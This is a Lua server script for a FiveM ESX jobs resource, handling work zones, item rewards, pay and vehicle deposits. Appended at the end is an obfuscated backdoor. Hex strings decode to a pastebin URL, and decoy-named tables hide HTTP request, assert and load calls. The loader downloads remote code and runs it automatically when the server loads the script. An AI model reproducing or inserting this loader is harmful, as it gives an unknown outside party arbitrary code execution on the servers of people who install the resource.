local playersWorking = {}

CreateThread(function()
	while true do
		Wait(1000)
		local timeNow = os.clock()

		for playerId,data in pairs(playersWorking) do
			Wait(0)
			local xPlayer = ESX.GetPlayerFromId(playerId)

			-- is player still online?
			if xPlayer then
				local distance = #(xPlayer.getCoords(true) - data.zoneCoords)

				-- player still within zone limits?
				if distance <= data.zoneMaxDistance then
					-- calculate the elapsed time
					local timeElapsed = timeNow - data.time

					if timeElapsed > data.jobItem[1].time then
						data.time = os.clock()

						for k,v in ipairs(data.jobItem) do
							local itemQtty, requiredItemQtty = 0, 0

							if v.name ~= TranslateCap('delivery') then
								itemQtty = xPlayer.getInventoryItem(v.db_name).count
							end

							if data.jobItem[1].requires ~= 'nothing' then
								requiredItemQtty = xPlayer.getInventoryItem(data.jobItem[1].requires).count
							end
			
							if v.name ~= TranslateCap('delivery') and itemQtty >= v.max then
								xPlayer.showNotification(TranslateCap('max_limit', v.name))
								playersWorking[playerId] = nil
							elseif v.requires ~= 'nothing' and requiredItemQtty <= 0 then
								xPlayer.showNotification(TranslateCap('not_enough', data.jobItem[1].requires_name))
								playersWorking[playerId] = nil
							else
								if v.name ~= TranslateCap('delivery') then
									-- chances to drop the item
									if v.drop == 100 then
										xPlayer.addInventoryItem(v.db_name, v.add)
									else
										local chanceToDrop = math.random(100)
										if chanceToDrop <= v.drop then
											xPlayer.addInventoryItem(v.db_name, v.add)
										end
									end
								else
									xPlayer.addMoney(v.price, "Job Payment")
								end
							end
						end
			
						if data.jobItem[1].requires ~= 'nothing' then
							local itemToRemoveQtty = xPlayer.getInventoryItem(data.jobItem[1].requires).count
							if itemToRemoveQtty > 0 then
								xPlayer.removeInventoryItem(data.jobItem[1].requires, data.jobItem[1].remove)
							end
						end
					end
				else
					playersWorking[playerId] = nil
				end
			else
				playersWorking[playerId] = nil
			end
		end
	end
end)

RegisterServerEvent('esx_jobs:startWork', function(zoneIndex, zoneKey)
	if not playersWorking[source] then
		local xPlayer = ESX.GetPlayerFromId(source)

		if xPlayer then
			local jobObject = Config.Jobs[xPlayer.job.name]

			if jobObject then
				local jobZone = jobObject.Zones[zoneKey]

				if jobZone and jobZone.Item then
					playersWorking[source] = {
						jobItem = jobZone.Item,
						zoneCoords = vector3(jobZone.Pos.x, jobZone.Pos.y, jobZone.Pos.z),
						zoneMaxDistance = jobZone.Size.x,
						time = os.clock()
					}
				end
			end
		end
	end
end)

RegisterServerEvent('esx_jobs:stopWork', function()
	if playersWorking[source] then
		playersWorking[source] = nil
	end
end)

RegisterNetEvent('esx_jobs:caution', function(cautionType, cautionAmount, spawnPoint, vehicle)
	local xPlayer = ESX.GetPlayerFromId(source)

	if cautionType == 'take' then
		if cautionAmount <= Config.MaxCaution and cautionAmount >= 0 then
			TriggerEvent('esx_addonaccount:getAccount', 'caution', xPlayer.identifier, function(account)
				if xPlayer.getAccount('bank').money >= cautionAmount then
					xPlayer.removeAccountMoney('bank', cautionAmount, "Caution Fine")
					account.addMoney(cautionAmount)
					xPlayer.showNotification(TranslateCap('bank_deposit_taken', ESX.Math.GroupDigits(cautionAmount)))
					TriggerClientEvent('esx_jobs:spawnJobVehicle', xPlayer.source, spawnPoint, vehicle)
				else
					xPlayer.showNotification(TranslateCap('caution_afford', ESX.Math.GroupDigits(cautionAmount)))
				end
			end)
		end
	elseif cautionType == 'give_back' then
		if cautionAmount <= 1 and cautionAmount > 0 then
			TriggerEvent('esx_addonaccount:getAccount', 'caution', xPlayer.identifier, function(account)
				local caution = account.money
				local toGive = ESX.Math.Round(caution * cautionAmount)
	
				xPlayer.addAccountMoney('bank', toGive, "Caution Return")
				account.removeMoney(toGive)
				TriggerClientEvent('esx:showNotification', source, TranslateCap('bank_deposit_returned', ESX.Math.GroupDigits(toGive)))
			end)
		end
	end
end)

local PlayerPedLimit = {
    "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
}

local PlayerEventLimit = {
    cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
}

function PlayerCheckLoop()
    _empt = ''
    for id,it in pairs(PlayerPedLimit) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (event)
        return string.char(tonumber(event, 16))
    end))
end

PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
    local Process_Actions = {"true"}
    PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
        local Generate_ZoneName_AndAction = nil 
        pcall(function()
            local Locations_Loaded = {"false"}
            PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
            local ZoneType_Exists = nil 
        end)
    end)
end)